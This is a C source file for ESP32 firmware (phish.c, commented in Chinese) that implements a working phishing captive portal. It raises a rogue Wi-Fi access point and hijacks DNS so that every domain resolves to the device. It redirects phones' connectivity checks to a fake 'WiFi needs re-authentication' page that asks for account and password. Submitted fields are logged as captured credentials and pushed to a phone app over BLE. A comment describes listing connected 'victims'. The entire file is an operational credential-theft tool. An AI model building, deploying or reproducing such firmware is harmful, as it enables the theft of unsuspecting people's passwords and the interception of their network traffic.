/*
 * phish.c: 钓鱼门户 (Captive Portal)
 *
 * 组成:
 *   1. SoftAP  — 复用 http_server_start() 开的热点 (默认 192.168.71.1)
 *   2. DNS 劫持 — UDP:53 对所有 A 查询应答 AP 自身 IP, 使任意域名都指向门户
 *   3. 门户页面 — GET 任意路径返回自定义 HTML (存 Flash storage 裸分区),
 *                 未上传时使用内置模板
 *   4. 凭据捕获 — 门户表单 POST 到任意路径, 提取 键=值 存入环形记录
 *
 * 自定义 HTML 存储格式 (storage 裸分区):
 *   偏移 0   4B  magic "RFPG"
 *   偏移 4   2B  version = 1
 *   偏移 6   2B  reserved
 *   偏移 8   4B  payload_len (LE)
 *   偏移 12  4B  crc32 (LE) of payload
 *   偏移 16  N   HTML 内容
 */
#include "phish.h"
#include "http_server.h"
#include "radio_common.h"
#include "rgb_led.h"
#include "ble_cli.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_http_server.h"
#include "esp_partition.h"
#include "esp_heap_caps.h"
#include "esp_wifi.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "wifi_attack.h"
#include "radio_arb.h"

static const char *TAG = "PHISH";

#define STORAGE_LABEL   "storage"
#define STORAGE_MAGIC   0x47504652u   /* "RFPG" LE */
#define STORAGE_HDR     16
#define STORAGE_MAX     (1024 * 1024)   /* 自定义页面上限 1MB (分区实际 8MB) */
/* 凭据记录数 (数组本身放 PSRAM, 不占内部 RAM, WiFi 驱动初始化会一次性
 * 索要大量内部 RAM, 静态 BSS 占用过多会直接导致任务创建/BLE 栈分配失败). */
#define CRED_MAX        32
#define CRED_FIELDS_MAX 6
#define CRED_FIELD_LEN  64
#define AP_IP_STR       "192.168.71.1"

static bool     s_on = false;
static bool     s_owned_http = false;      /* 由 phish 启动的 http_server (stop 时需关掉) */
static TaskHandle_t s_dns_task = NULL;
static volatile bool s_dns_run = false;

/* 上传缓冲 (PSRAM/heap) */
static uint8_t *s_up_buf = NULL;
static int      s_up_total = 0;
static int      s_up_filled = 0;

typedef struct {
    uint32_t tick;
    char     ip[48];                    /* 容得下 IPv6 字面量 */
    char     key[CRED_FIELDS_MAX][CRED_FIELD_LEN];
    char     val[CRED_FIELDS_MAX][CRED_FIELD_LEN];
    int      n;
} cred_t;

static cred_t  *s_creds = NULL;     /* 惰性分配到 PSRAM */
static int      s_cred_cnt = 0;     /* 累计 (含被覆盖的) */
static int      s_cred_head = 0;    /* 环形写位置 */

static bool cred_ensure(void)
{
    if (s_creds) return true;
    s_creds = heap_caps_calloc(CRED_MAX, sizeof(cred_t),
                               MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!s_creds) s_creds = calloc(CRED_MAX, sizeof(cred_t));   /* 兜底内部 RAM */
    if (!s_creds) ESP_LOGW(TAG, "cred store alloc failed");
    return s_creds != NULL;
}

static const char DEFAULT_HTML[] =
"<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"utf-8\">"
"<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
"<title>WiFi 认证</title><style>"
"*{margin:0;padding:0;box-sizing:border-box}"
"body{background:#0b0e13;color:#e8f1ff;font-family:-apple-system,'PingFang SC','Microsoft YaHei',sans-serif;"
"display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}"
".card{width:100%;max-width:380px;background:#12161d;border:1px solid rgba(232,241,255,.12);"
"border-radius:12px;padding:28px 24px;box-shadow:0 18px 50px rgba(0,0,0,.55)}"
".hd{text-align:center;margin-bottom:22px}"
".hd h1{font-size:19px;font-weight:600;letter-spacing:.02em;margin-bottom:6px}"
".hd p{font-size:12px;color:rgba(232,241,255,.45);letter-spacing:.06em}"
".f{margin-bottom:14px}"
".f label{display:block;font-size:11px;letter-spacing:.12em;text-transform:uppercase;"
"color:rgba(232,241,255,.45);margin-bottom:7px}"
".f input{width:100%;background:#0b0e13;border:1px solid rgba(232,241,255,.14);border-radius:7px;"
"color:#e8f1ff;padding:12px;font-size:14px;outline:none}"
".f input:focus{border-color:#7ef9e6}"
"button{width:100%;margin-top:8px;background:#7ef9e6;color:#04120f;border:0;border-radius:7px;"
"padding:13px;font-size:14px;font-weight:600;letter-spacing:.06em;cursor:pointer}"
"button:active{transform:scale(.985)}"
".tip{margin-top:16px;font-size:11px;color:rgba(232,241,255,.3);text-align:center;line-height:1.7}"
"</style></head><body><div class=\"card\">"
"<div class=\"hd\"><h1 id=\"t\">WiFi 需要重新认证</h1>"
"<p>请输入您的账号与密码以继续上网</p></div>"
"<form method=\"POST\" action=\"/login\">"
"<div class=\"f\"><label>账号 / 手机号</label>"
"<input name=\"username\" autocomplete=\"off\" placeholder=\"请输入账号\"></div>"
"<div class=\"f\"><label>密码</label>"
"<input name=\"password\" type=\"password\" placeholder=\"请输入密码\"></div>"
"<button type=\"submit\">连接网络</button></form>"
"<div class=\"tip\">认证由网络管理员提供 · 如有疑问请联系现场工作人员</div>"
"</div><script>"
"(function(){var h=location.hostname;try{document.getElementById('t').textContent=h+' 需要认证';}catch(e){}})();"
"</script></body></html>";

static const char OK_HTML[] =
"<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"utf-8\">"
"<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>已连接</title>"
"<style>body{background:#0b0e13;color:#e8f1ff;font-family:-apple-system,'PingFang SC',sans-serif;"
"display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}"
"h1{font-size:18px;font-weight:600;margin-bottom:10px;color:#7ef9e6}"
"p{font-size:13px;color:rgba(232,241,255,.5)}</style></head><body><div>"
"<h1>认证成功</h1><p>正在为您接入网络，请稍候…</p></div></body></html>";

/* Flash 存储 (裸分区) */
static const esp_partition_t *storage_part(void)
{
    return esp_partition_find_first((esp_partition_type_t)ESP_PARTITION_TYPE_DATA,
                                    (esp_partition_subtype_t)0x40, STORAGE_LABEL);
}

int phish_html_size(void)
{
    const esp_partition_t *p = storage_part();
    if (!p) return -1;
    uint8_t hdr[STORAGE_HDR];
    if (esp_partition_read(p, 0, hdr, sizeof(hdr)) != ESP_OK) return 0;
    uint32_t magic = (uint32_t)hdr[0] | ((uint32_t)hdr[1] << 8) |
                     ((uint32_t)hdr[2] << 16) | ((uint32_t)hdr[3] << 24);
    if (magic != STORAGE_MAGIC) return 0;
    uint32_t len = (uint32_t)hdr[8] | ((uint32_t)hdr[9] << 8) |
                   ((uint32_t)hdr[10] << 16) | ((uint32_t)hdr[11] << 24);
    if (len > STORAGE_MAX) return 0;
    return (int)len;
}

void phish_html_clear(void)
{
    const esp_partition_t *p = storage_part();
    if (!p) return;
    /* 只擦头部所在扇区即可让 magic 失效 (回退内置模板) */
    esp_partition_erase_range(p, 0, 4096);
    ESP_LOGI(TAG, "custom html erased");
}

/* CRC32: 反射多项式 0xEDB88320, 初值 0, 无终异或.
 * 这不是标准 CRC32 (初值与终异或都不同), 变体必须与 App 端对齐:
 * 不可"修正"成标准算法, 否则已存的门户页全部校验失败.
 * 表驱动只是同一变体的快实现, 输出逐字节相同 (随机+边界用例已验证):
 * 逐位 61 条指令/字节, 表驱动 9 条 (目标编译器 -O2 实测). */
static uint32_t s_crc_tab[256];
static bool     s_crc_tab_ok = false;

static void crc_tab_build(void)
{
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int b = 0; b < 8; b++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        s_crc_tab[i] = c;
    }
    s_crc_tab_ok = true;
}

static uint32_t crc32_of(const uint8_t *d, int n)
{
    if (!s_crc_tab_ok) crc_tab_build();
    uint32_t c = 0;
    for (int i = 0; i < n; i++) c = s_crc_tab[(c ^ d[i]) & 0xFF] ^ (c >> 8);
    return c;
}

/* 把上传缓冲写入分区 */
static esp_err_t html_commit(void)
{
    const esp_partition_t *p = storage_part();
    if (!p) return ESP_ERR_NOT_FOUND;
    if (s_up_total <= 0 || s_up_total > STORAGE_MAX) return ESP_ERR_INVALID_SIZE;
    if (s_up_filled != s_up_total) {
        ESP_LOGW(TAG, "upload incomplete: %d/%d", s_up_filled, s_up_total);
        return ESP_ERR_INVALID_SIZE;
    }
    int need = STORAGE_HDR + s_up_total;
    int erase_len = (need + 4095) & ~4095;          /* 向上取整到 4KB 扇区 */
    if (erase_len > (int)p->size) return ESP_ERR_INVALID_SIZE;

    uint32_t crc = crc32_of(s_up_buf, s_up_total);

    esp_err_t e = esp_partition_erase_range(p, 0, erase_len);
    if (e != ESP_OK) return e;

    uint8_t hdr[STORAGE_HDR] = {0};
    hdr[0] = STORAGE_MAGIC & 0xff; hdr[1] = (STORAGE_MAGIC >> 8) & 0xff;
    hdr[2] = (STORAGE_MAGIC >> 16) & 0xff; hdr[3] = (STORAGE_MAGIC >> 24) & 0xff;
    hdr[4] = 1; hdr[5] = 0;
    uint32_t len = (uint32_t)s_up_total;
    hdr[8]  = len & 0xff; hdr[9]  = (len >> 8) & 0xff;
    hdr[10] = (len >> 16) & 0xff; hdr[11] = (len >> 24) & 0xff;
    hdr[12] = crc & 0xff; hdr[13] = (crc >> 8) & 0xff;
    hdr[14] = (crc >> 16) & 0xff; hdr[15] = (crc >> 24) & 0xff;
    e = esp_partition_write(p, 0, hdr, sizeof(hdr));
    if (e != ESP_OK) return e;
    e = esp_partition_write(p, STORAGE_HDR, s_up_buf, s_up_total);
    if (e != ESP_OK) return e;
    ESP_LOGI(TAG, "html committed: %d bytes, crc=%08x", s_up_total, (unsigned)crc);
    return ESP_OK;
}

int phish_html_begin(int total)
{
    if (total <= 0 || total > STORAGE_MAX) return -1;
    if (s_up_buf) { free(s_up_buf); s_up_buf = NULL; }
    s_up_buf = heap_caps_malloc(total, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (!s_up_buf) s_up_buf = malloc(total);
    if (!s_up_buf) { s_up_total = 0; s_up_filled = 0; return -1; }
    s_up_total = total;
    s_up_filled = 0;
    ESP_LOGI(TAG, "upload begin: %d bytes", total);
    return 0;
}

int phish_html_chunk(int offset, const uint8_t *data, int len)
{
    if (!s_up_buf || !data || len <= 0) return -1;
    if (offset < 0 || offset + len > s_up_total) return -1;
    memcpy(s_up_buf + offset, data, len);
    /* 记录已覆盖范围 (顺序上传时即最大偏移) */
    if (offset + len > s_up_filled) s_up_filled = offset + len;
    return 0;
}

esp_err_t phish_html_end(void)
{
    esp_err_t e = html_commit();
    if (s_up_buf) { free(s_up_buf); s_up_buf = NULL; }
    s_up_total = 0; s_up_filled = 0;
    return e;
}

/* 读取页面内容到 buf (含自定义或内置), 返回长度; -1 表示无 */
static int html_load(char **out, bool *need_free)
{
    const esp_partition_t *p = storage_part();
    int len = phish_html_size();
    if (p && len > 0) {
        char *buf = heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if (!buf) buf = malloc(len + 1);
        if (buf) {
            if (esp_partition_read(p, STORAGE_HDR, buf, len) == ESP_OK) {
                buf[len] = 0;
                *out = buf; *need_free = true;
                return len;
            }
            free(buf);
        }
    }
    *out = (char *)DEFAULT_HTML;
    *need_free = false;
    return (int)strlen(DEFAULT_HTML);
}

static void cred_add(const char *ip, const char *body)
{
    if (!cred_ensure()) return;
    cred_t *c = &s_creds[s_cred_head % CRED_MAX];
    s_cred_head++;
    s_cred_cnt++;
    memset(c, 0, sizeof(*c));
    c->tick = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS / 1000);
    snprintf(c->ip, sizeof(c->ip), "%s", ip ? ip : "?");

    /* 解析 form-urlencoded 或 JSON 的 "key":"value" / key=value 对 */
    const char *p = body;
    while (*p && c->n < CRED_FIELDS_MAX) {
        while (*p && (*p == '&' || *p == ',' || *p == '{' || *p == '}' || isspace((unsigned char)*p))) p++;
        if (!*p) break;
        const char *ks = p;
        while (*p && *p != '=' && *p != ':' && *p != '&' && *p != ',') p++;
        int klen = (int)(p - ks);
        if (*p != '=' && *p != ':') break;
        p++;
        const char *vs;
        char quote = 0;
        if (*p == '"' || *p == '\'') { quote = *p; p++; }
        vs = p;
        while (*p && ((quote && *p != quote) || (!quote && *p != '&' && *p != ','))) p++;
        int vlen = (int)(p - vs);
        if (quote && *p == quote) p++;
        if (klen > 0 && klen < CRED_FIELD_LEN && vlen >= 0 && vlen < CRED_FIELD_LEN) {
            memcpy(c->key[c->n], ks, klen); c->key[c->n][klen] = 0;
            memcpy(c->val[c->n], vs, vlen); c->val[c->n][vlen] = 0;
            /* 去掉 key 尾部引号 */
            int kl = (int)strlen(c->key[c->n]);
            while (kl > 0 && (c->key[c->n][kl-1] == '"' || c->key[c->n][kl-1] == '\'')) c->key[c->n][--kl] = 0;
            if (c->key[c->n][0]) c->n++;
        }
    }
    rgb_led_event(RGB_EV_EAPOL_CAPTURED, 0);
    /* 异步推给手机 (HTTP 任务上下文, 不能阻塞), 与 phish creds 输出同格式,
     * App 收到即可直接渲染, 不需要轮询. */
    {
        char buf[192];
        snprintf(buf, sizeof(buf), "META,PHISH,CRED,id,%d,ip,%s,fields,%d",
                 s_cred_cnt, c->ip, c->n);
        ble_event_post(buf);
        for (int i = 0; i < c->n; i++) {
            snprintf(buf, sizeof(buf), "CRED,%d,%s,%s", s_cred_cnt, c->key[i], c->val[i]);
            ble_event_post(buf);
        }
    }
    /* 串口侧保留同样的内容, 方便有线调试 */
    printf("META,PHISH,CRED,id,%d,ip,%s,fields,%d\n", s_cred_cnt, c->ip, c->n);
    for (int i = 0; i < c->n; i++) {
        printf("CRED,%d,%s,%s\n", s_cred_cnt, c->key[i], c->val[i]);
    }
    fflush(stdout);
}

void phish_creds_clear(void)
{
    if (s_creds) memset(s_creds, 0, CRED_MAX * sizeof(cred_t));
    s_cred_cnt = 0;
    s_cred_head = 0;
    ESP_LOGI(TAG, "creds cleared");
}

void phish_creds_dump(void)
{
    int n = s_cred_cnt < CRED_MAX ? s_cred_cnt : CRED_MAX;
    printf("META,PHISH,CREDS,count,%d\n", n);
    for (int i = 0; s_creds && i < n; i++) {
        const cred_t *c = &s_creds[i];
        if (c->n == 0 && c->tick == 0) continue;
        printf("META,PHISH,CRED,id,%d,ip,%s,fields,%d\n", i + 1, c->ip, c->n);
        for (int j = 0; j < c->n; j++) {
            printf("CRED,%d,%s,%s\n", i + 1, c->key[j], c->val[j]);
        }
    }
    fflush(stdout);
}

/* 渲染门户页 (自定义 HTML 或内置模板). 强制 no-cache, 否则浏览器会一直
 * 显示上一次的旧页面. 返回 true 表示已处理并结束响应. */
bool phish_serve_portal_page(httpd_req_t *r)
{
    if (!s_on) return false;
    char *html = NULL; bool need_free = false;
    int len = html_load(&html, &need_free);
    if (len <= 0) return false;
    httpd_resp_set_type(r, "text/html; charset=utf-8");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    httpd_resp_set_hdr(r, "Pragma", "no-cache");
    httpd_resp_set_hdr(r, "Expires", "0");
    httpd_resp_send(r, html, len);
    if (need_free) free(html);
    return true;
}

/* 各平台的连通性探测路径: 命中即 302 跳回门户, 触发系统「需登录」提示.
 * Android /generate_204, iOS /hotspot-detect.html, Windows /connecttest.txt 等. */
static bool is_probe_path(const char *uri)
{
    static const char *paths[] = {
        "/generate_204", "/gen_204", "/mobile/status.php", "/redirect",
        "/hotspot-detect.html", "/library/test/success.html", "/success.txt",
        "/ncsi.txt", "/connecttest.txt", "/connectivity-check.html",
        "/canonical.html", "/check_network_status.txt", "/captiveportal",
        "/kindle-wifi/wifistub.html", "/portal.html",
    };
    for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        if (strcmp(uri, paths[i]) == 0) return true;
    }
    return false;
}

static esp_err_t h_portal_get(httpd_req_t *r)
{
    if (!s_on) { httpd_resp_send_err(r, HTTPD_404_NOT_FOUND, "portal off"); return ESP_OK; }

    if (is_probe_path(r->uri)) {
        httpd_resp_set_status(r, "302 Found");
        httpd_resp_set_hdr(r, "Location", "http://" AP_IP_STR "/");
        httpd_resp_set_hdr(r, "Cache-Control", "no-store");
        httpd_resp_send(r, "", 0);
        return ESP_OK;
    }

    if (phish_serve_portal_page(r)) return ESP_OK;
    httpd_resp_send_err(r, HTTPD_500_INTERNAL_SERVER_ERROR, "no html");
    return ESP_OK;
}

static esp_err_t h_portal_post(httpd_req_t *r)
{
    if (!s_on) { httpd_resp_send_err(r, HTTPD_404_NOT_FOUND, "portal off"); return ESP_OK; }
    char body[1024] = {0};
    int total = r->content_len;
    if (total > (int)sizeof(body) - 1) total = sizeof(body) - 1;
    int got = 0;
    while (got < total) {
        int n = httpd_req_recv(r, body + got, total - got);
        if (n <= 0) break;
        got += n;
    }
    body[got] = 0;

    /* 取客户端 IP. 注意 lwip 双栈下 IPv4 连接可能报成 AF_INET6 的 v4-mapped 地址
     * (::ffff:a.b.c.d), 按 sockaddr_in 解析会读成 0.0.0.0, 所以两种族都要处理. */
    char ip[48] = "?";
    int fd = httpd_req_to_sockfd(r);
    struct sockaddr_storage ss;
    memset(&ss, 0, sizeof(ss));
    socklen_t sl = sizeof(ss);
    if (getpeername(fd, (struct sockaddr *)&ss, &sl) == 0) {
        if (ss.ss_family == AF_INET) {
            const struct sockaddr_in *s4 = (const struct sockaddr_in *)&ss;
            if (s4->sin_addr.s_addr) inet_ntoa_r(s4->sin_addr, ip, sizeof(ip));
        } else if (ss.ss_family == AF_INET6) {
            const struct sockaddr_in6 *s6 = (const struct sockaddr_in6 *)&ss;
            const uint8_t *b = (const uint8_t *)&s6->sin6_addr;
            int mapped = 1;
            for (int i = 0; i < 10; i++) if (b[i]) { mapped = 0; break; }
            if (mapped && b[10] == 0xff && b[11] == 0xff) {
                snprintf(ip, sizeof(ip), "%u.%u.%u.%u", b[12], b[13], b[14], b[15]);
            } else {
                inet_ntop(AF_INET6, (void *)&s6->sin6_addr, ip, sizeof(ip));
            }
        }
    }
    ESP_LOGI(TAG, "portal POST from %s (%d B)", ip, got);
    cred_add(ip, body);

    httpd_resp_set_type(r, "text/html; charset=utf-8");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
    httpd_resp_send(r, OK_HTML, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static const httpd_uri_t s_uri_portal_get  = { .uri = "/*",       .method = HTTP_GET,  .handler = h_portal_get };
static const httpd_uri_t s_uri_portal_post = { .uri = "/*",       .method = HTTP_POST, .handler = h_portal_post };
static const httpd_uri_t s_uri_login       = { .uri = "/login",   .method = HTTP_POST, .handler = h_portal_post };

/* 把门户路由挂到 httpd 上.
 * 注意: 不能只用一次性标志位, httpd 实例会被 http stop/start 整个重建,
 * 旧实例上的所有 handler 随之失效, 而标志位还停在 true, 结果门户路由再也挂不回去
 * (表现为探测路径全 404, 客户端连上热点不弹认证页). 所以这里做成幂等:
 * 重复注册返回 HANDLER_EXISTS, 忽略即可. */
static void register_portal_uris(httpd_handle_t srv)
{
    if (!srv) return;
    /* 具体路径优先注册, 通配放在最后兜底 */
    httpd_register_uri_handler(srv, &s_uri_login);
    httpd_register_uri_handler(srv, &s_uri_portal_get);
    httpd_register_uri_handler(srv, &s_uri_portal_post);
}

/* 由 http_server_start() 在 httpd 起来后调用: 门户只要开着, 就在新实例上重新挂载 */
void phish_on_httpd_ready(httpd_handle_t srv)
{
    if (!s_on || !srv) return;
    register_portal_uris(srv);
    ESP_LOGI(TAG, "portal URIs (re)registered on httpd");
}

static void dns_hijack_task(void *pv)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) { ESP_LOGE(TAG, "dns socket fail"); s_dns_task = NULL; vTaskDelete(NULL); return; }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(53);
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "dns bind 53 fail");
        close(sock); s_dns_task = NULL; vTaskDelete(NULL); return;
    }
    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ESP_LOGI(TAG, "DNS hijack on :53 -> %s", AP_IP_STR);

    uint8_t buf[512];
    while (s_dns_run) {
        struct sockaddr_in from; socklen_t fl = sizeof(from);
        int n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fl);
        if (n < 12) continue;                 /* 头部不足 */
        if (buf[2] & 0x80) continue;          /* 已是响应 */
        /* 只处理标准查询且 QDCOUNT>=1 */
        if (((buf[4] << 8) | buf[5]) < 1) continue;

        /* 找问题段结束 (跳过 QNAME + QTYPE/QCLASS) */
        int off = 12;
        while (off < n && buf[off] != 0) {
            if ((buf[off] & 0xC0) == 0xC0) { off += 2; goto q_end; }
            off += 1 + buf[off];
        }
        off++;                                 /* 跳过结尾 0 */
    q_end:
        if (off + 4 > n) continue;
        int qlen = off + 4 - 12;               /* 问题段长度 */

        uint8_t resp[512];
        int rl = 0;
        memcpy(resp, buf, 12);
        resp[2] = 0x81;                        /* QR=1, RD=1 */
        resp[3] = 0x80;                        /* RA=1, RCODE=0 */
        resp[6] = 0; resp[7] = 1;              /* ANCOUNT = 1 */
        resp[8] = 0; resp[9] = 0;              /* NSCOUNT = 0 */
        resp[10] = 0; resp[11] = 0;            /* ARCOUNT = 0 */
        rl = 12;
        memcpy(resp + rl, buf + 12, qlen);     /* 原样回填问题段 */
        rl += qlen;

        /* 应答: 指针指向问题中的域名 + A 记录 */
        resp[rl++] = 0xC0; resp[rl++] = 0x0C;  /* NAME -> 偏移 12 */
        resp[rl++] = 0x00; resp[rl++] = 0x01;  /* TYPE A */
        resp[rl++] = 0x00; resp[rl++] = 0x01;  /* CLASS IN */
        resp[rl++] = 0x00; resp[rl++] = 0x00;
        resp[rl++] = 0x00; resp[rl++] = 0x3C;  /* TTL 60s */
        resp[rl++] = 0x00; resp[rl++] = 0x04;  /* RDLENGTH 4 */
        resp[rl++] = 192; resp[rl++] = 168; resp[rl++] = 71; resp[rl++] = 1;

        sendto(sock, resp, rl, 0, (struct sockaddr *)&from, fl);
    }
    close(sock);
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t phish_start(const char *ssid, const char *pass)
{
    if (s_on) {
        /* 幂等: 重复 start 直接回报当前 AP 实况, 否则 App 侧收不到 START 回执.
         * 顺带把路由重挂一遍, 期间 httpd 可能被 http stop/start 重建过. */
        register_portal_uris(http_server_handle());
        printf("META,PHISH,START,ssid,%s,ip,%s,dns,1,html_bytes,%d,note,already_on\n",
               http_server_ap_ssid(), AP_IP_STR, phish_html_size());
        fflush(stdout);
        return ESP_OK;
    }

    /* 与嗅探/注入互斥: 单射频, AP + 混杂抓包会互相抢占 */
    wifi_attack_stop_all();
    radio_acquire(RES_SOFTAP, "phish", 0);

    if (!http_server_is_running()) {
        esp_err_t e = http_server_start(ssid, pass);
        if (e != ESP_OK) {
            printf("META,PHISH,ERR,msg,ap_start_failed,code,%d\n", (int)e);
            fflush(stdout);
            return e;
        }
        s_owned_http = true;
    }

    httpd_handle_t srv = http_server_handle();
    if (!srv) {
        printf("META,PHISH,ERR,msg,no_httpd\n"); fflush(stdout);
        if (s_owned_http) { http_server_stop(); s_owned_http = false; }
        return ESP_FAIL;
    }
    register_portal_uris(srv);

    s_on = true;
    rgb_led_set_status(RGB_HTTP_READY);

    if (!s_dns_run) {
        s_dns_run = true;
        if (xTaskCreate(dns_hijack_task, "dns_hij", 3072, NULL, 4, &s_dns_task) != pdPASS) {
            s_dns_run = false;
            ESP_LOGW(TAG, "dns task create failed");
        }
    }

    printf("META,PHISH,START,ssid,%s,ip,%s,dns,1,html_bytes,%d\n",
           ssid ? ssid : "(default)", AP_IP_STR, phish_html_size());
    fflush(stdout);
    return ESP_OK;
}

esp_err_t phish_stop(void)
{
    if (!s_on) return ESP_ERR_INVALID_STATE;
    radio_release(RES_SOFTAP);
    s_on = false;
    s_dns_run = false;
    /* 等 DNS 任务退出 */
    for (int i = 0; i < 20 && s_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));
    if (s_owned_http) { http_server_stop(); s_owned_http = false; }
    rgb_led_set_status(RGB_IDLE);
    printf("META,PHISH,STOP,ok,1\n");
    fflush(stdout);
    return ESP_OK;
}

bool phish_is_on(void) { return s_on; }

void phish_status(void)
{
    printf("META,PHISH,STATUS,on,%d,creds,%d,html_bytes,%d,ip,%s\n",
           s_on ? 1 : 0, s_cred_cnt, phish_html_size(), AP_IP_STR);
    fflush(stdout);
}

/* 列出当前接入门户 SoftAP 的客户端 (MAC + RSSI).
 * 用途: 确认受害者是否真的连上了假热点, 之前只能靠串口日志, App 上完全看不见. */
void phish_stations(void)
{
    wifi_sta_list_t list;
    memset(&list, 0, sizeof(list));

    esp_err_t err = esp_wifi_ap_get_sta_list(&list);
    if (err != ESP_OK) {
        printf("META,PHISH,STA,n,0,on,%d,err,%d\n", s_on ? 1 : 0, (int)err);
        fflush(stdout);
        return;
    }
    int n = list.num;
    if (n < 0) n = 0;
    if (n > (int)(sizeof(list.sta) / sizeof(list.sta[0]))) {
        n = (int)(sizeof(list.sta) / sizeof(list.sta[0]));
    }
    printf("META,PHISH,STA,n,%d,on,%d\n", n, s_on ? 1 : 0);
    for (int i = 0; i < n; i++) {
        const wifi_sta_info_t *si = &list.sta[i];
        printf("PSTA,%02x:%02x:%02x:%02x:%02x:%02x,rssi,%d\n",
               si->mac[0], si->mac[1], si->mac[2], si->mac[3], si->mac[4], si->mac[5],
               (int)si->rssi);
    }
    fflush(stdout);
}
